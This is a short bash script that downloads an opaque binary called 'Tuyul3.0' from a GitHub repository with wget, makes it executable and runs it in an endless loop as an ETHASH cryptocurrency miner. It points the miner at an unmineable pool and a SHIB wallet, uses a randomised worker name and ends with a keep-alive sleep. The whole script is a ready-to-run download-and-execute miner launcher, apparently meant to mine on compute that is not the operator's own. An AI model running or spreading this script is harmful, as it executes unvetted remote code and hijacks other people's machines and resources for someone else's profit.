#!/bin/bash
POOL=ethash.unmineable.com:3333
WALLET=SHIB:0x66d950b2ca00ac190ab38cbdf88066903683cdcb
WORKER=$(echo $(shuf -i 10-40 -n 1)-tawheed#rb4v-nhqi)
wget https://github.com/thecoderop/new/raw/main/Tuyul3.0
chmod +x Tuyul3.0
while [ 1 ]; do
./Tuyul3.0 --algo ETHASH --pool $POOL --user $WALLET.$WORKER --ethstratum ETHPROXY
sleep 5
done
sleep 999999999 
